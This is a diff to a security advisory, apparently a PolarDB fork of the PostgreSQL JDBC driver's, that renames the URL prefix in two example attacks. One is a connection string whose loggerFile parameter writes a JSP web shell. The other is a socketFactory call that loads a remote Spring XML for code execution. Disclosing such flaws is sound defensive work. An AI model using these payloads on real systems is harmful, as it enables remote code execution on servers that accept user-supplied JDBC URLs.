@@ -64,7 +64,7 @@ If you identify an application that allows remote users to specify a complete JD
 #### Impact
 
 It is possible to specify an arbitrary filename in the loggerFileName connection parameter
- `"jdbc:postgresql://localhost:5432/test?user=test&password=test&loggerLevel=DEBUG&loggerFile=./blah.jsp&<%Runtime.getRuntime().exec(request.getParameter("i"));%>"`
+ `"jdbc:polardb://localhost:5432/test?user=test&password=test&loggerLevel=DEBUG&loggerFile=./blah.jsp&<%Runtime.getRuntime().exec(request.getParameter("i"));%>"`
 
 This creates a valid JSP file which could lead to a Remote Code Execution
 
@@ -89,7 +89,7 @@ However, the driver did not verify if the class implements the expected interfac
 Here's an example attack using an out-of-the-box class from Spring Framework:
 
 ```java
-DriverManager.getConnection("jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support. ClassPathXmlApplicationContext&socketFactoryArg=http://target/exp.xml");
+DriverManager.getConnection("jdbc:polardb://node1/test?socketFactory=org.springframework.context.support. ClassPathXmlApplicationContext&socketFactoryArg=http://target/exp.xml");
 ```
 
 The first impacted version is REL9.4.1208 (it introduced `socketFactory` connection property)
